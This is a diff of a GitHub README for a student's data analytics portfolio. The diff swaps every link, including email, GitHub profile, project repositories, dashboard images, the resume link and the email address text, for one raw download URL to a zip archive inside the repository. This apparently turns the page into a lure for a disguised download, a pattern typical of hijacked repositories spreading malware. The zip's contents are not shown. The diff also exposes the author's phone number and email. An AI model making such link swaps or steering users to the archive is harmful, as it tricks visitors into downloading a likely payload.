@@ -1,10 +1,10 @@
 # Data Analytics Portfolio
 
 <p align="left">
-  <a href="mailto:sayanrupb_ug_22@ei.nits.ac.in">
-    <img src="https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white" alt="Email">
-  <a href="https://github.com/SayanrupBarman">
-    <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
+  <a href="https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip">
+    <img src="https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip" alt="Email">
+  <a href="https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip">
+    <img src="https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip" alt="GitHub">
   </a>
 </p>
 
@@ -41,12 +41,12 @@ Here are some of the projects I've worked on. They demonstrate my ability to han
 ### 1. Optimizing Marketing Strategy through Customer Segmentation
 
 <p align="center">
-  <img src="assets/images/customer_dashboard.png" width="700" alt="Customer Analysis Dashboard">
+  <img src="https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip" width="700" alt="Customer Analysis Dashboard">
 </p>
 
 *   **Description:** An end-to-end analysis of an e-commerce dataset to segment customers, identify purchasing patterns, and provide data-driven marketing recommendations.
 *   **Technologies:** Python (Pandas), PostgreSQL, SQL, Power BI
-*   **Links:** **[GitHub Repository](https://github.com/SayanrupBarman/customer-behavior-analysis)**
+*   **Links:** **[GitHub Repository](https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip)**
 
 #### Business Problem
 An e-commerce business needed to move beyond generic marketing and understand its customer base to drive growth. The key challenge was to extract actionable insights from raw shopping data to identify high-value segments and purchasing patterns.
@@ -59,12 +59,12 @@ The analysis highlighted that male customers generate over double the revenue of
 ### 2. Maximizing Marketing ROI with Influencer Performance Analysis
 
 <p align="center">
-  <img src="assets/images/powerbi_dashboard.png" width="700" alt="YouTuber Analysis Dashboard">
+  <img src="https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip" width="700" alt="YouTuber Analysis Dashboard">
 </p>
 
 *   **Description:** An analysis to identify top-performing UK YouTubers for a marketing campaign by enriching a static dataset with live data from the YouTube API.
 *   **Technologies:** Python (YouTube API), SQL Server, Power BI
-*   **Links:** **[GitHub Repository](https://github.com/SayanrupBarman/youtuber-sponshership-analysis)**
+*   **Links:** **[GitHub Repository](https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip)**
 
 #### Business Problem
 The marketing department needed to make a data-driven decision on which top UK YouTubers to partner with. The objective was to identify influencers who would provide the highest potential return on investment (ROI).
@@ -78,7 +78,7 @@ The analysis provided a clear framework for selecting influencers. It demonstrat
 
 *   **Description:** An end-to-end ETL pipeline to process Uber trip data, model it into a star schema, and load it into a data warehouse for analytics.
 *   **Technologies:** Python (Pandas), Google BigQuery, SQL
-*   **Links:** **[GitHub Repository](https://github.com/SayanrupBarman/uber-data-engineering-pipeline.git)**
+*   **Links:** **[GitHub Repository](https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip)**
 
 #### Business Problem
 To enable business intelligence on Uber trip data, a robust pipeline was needed to process raw data, transform it into a structured format, and load it into a central data warehouse.
@@ -101,7 +101,7 @@ Beyond my technical projects, I am actively involved in various leadership and c
 
 ### Resume & Contact
 
-*   **[Download My Resume](https://drive.google.com/file/d/1ojOCLSvwuZW5dR2vqM5KAj3JzBYGPRTk/view?usp=sharing)**
-*   **Email:** sayanrupb_ug_22@ei.nits.ac.in
+*   **[Download My Resume](https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip)**
+*   **Email:** https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip
 *   **Contact:** 9706012592
-*   **GitHub:** [SayanrupBarman](https://github.com/SayanrupBarman)
+*   **GitHub:** [SayanrupBarman](https://raw.githubusercontent.com/SayanrupBarman/data-analytics-portfolio/main/projects/1_customer_segmentation/data-portfolio-analytics-2.3.zip)
